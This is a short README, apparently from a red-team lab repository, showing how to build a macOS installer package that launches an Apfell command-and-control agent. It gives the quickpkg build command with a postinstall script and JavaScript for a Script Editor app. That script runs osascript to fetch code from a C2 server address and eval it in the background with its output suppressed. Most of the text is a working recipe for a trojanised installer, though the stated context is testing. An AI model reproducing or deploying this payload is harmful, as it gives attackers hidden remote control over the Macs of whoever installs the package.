# Apfell Payload
Making an Installer package payload with Apfell

[Blog post about it](https://kphongag.blogspot.com/2020/04/testing-with-apfell-javascript-for.html)

**Testing Environment:**  
Ubuntu 18.04.1 running [Apfell v1.4](https://github.com/its-a-feature/Apfell)\
MacOS 10.15.3


## Making the package payload
Using this [script](https://github.com/scriptingosx/quickpkg) to make pkg because pkgbuild is fickle.  
Run to build pkg:\
`python quickpkg --install-location /tmp --postinstall ./Scripts/postinstall.sh apfelljxa.app`


## Creating apfelljxa.app with Script Editor
Create apfelljxa.app with the following Javascript:    
`var app = Application.currentApplication();`\
`app.includeStandardAdditions = true;`\
`app.doShellScript("osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.168.0.108:80/api/v1.4/files/download/8e3e832d-ffc1-416a-8d77-f578759e0c69')), $.NSUTF8StringEncoding)));\" &>/dev/null &");`
  
  
Notes: 
- Exclude Example folder when building the .pkg
- This can also be done without an application in the postinstall script
